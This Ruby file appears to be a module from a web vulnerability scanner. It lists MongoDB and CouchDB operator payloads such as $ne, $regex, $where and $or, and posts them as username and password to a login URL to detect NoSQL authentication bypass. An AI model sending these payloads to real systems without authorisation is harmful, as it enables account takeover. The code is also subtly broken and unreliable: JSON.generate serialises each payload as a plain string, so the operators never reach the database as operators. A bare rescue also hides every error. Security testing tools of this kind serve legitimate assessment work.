require 'uri'
require 'json'
require_relative '../utils/network'
require_relative '../utils/colorize'

class NoSQLInjection
  PAYLOADS = {
    mongo: [
      '{"$ne": null}',
      '{"$ne": ""}',
      '{"$gt": ""}',
      '{"$regex": ".*"}',
      '{"$where": "this.username == this.password"}',
      '{"$or": [{"username": "admin"}, {"password": "admin"}]}',
      '{"username": {"$ne": null}, "password": {"$ne": null}}',
      '{"username": {"$regex": ".*"}, "password": {"$regex": ".*"}}'
    ],
    couchdb: [
      '{"$ne": null}',
      '{"selector": {"$ne": null}}'
    ]
  }

  def self.test(url, db_type = :mongo)
    vulnerable = false
    payloads = PAYLOADS[db_type] || PAYLOADS[:mongo]
    
    payloads.each do |payload|
      begin
        data = JSON.generate({ username: payload, password: payload })
        response = Network.http_request(url, :post, {
          'Content-Type' => 'application/json'
        }, data)
        
        next unless response
        
        if response.code == "200" && (response.body.include?("success") || response.body.include?("logged"))
          puts Colorize.red("NoSQL injection: #{payload}")
          vulnerable = true
        end
      rescue
      end
    end
    
    vulnerable
  end
end

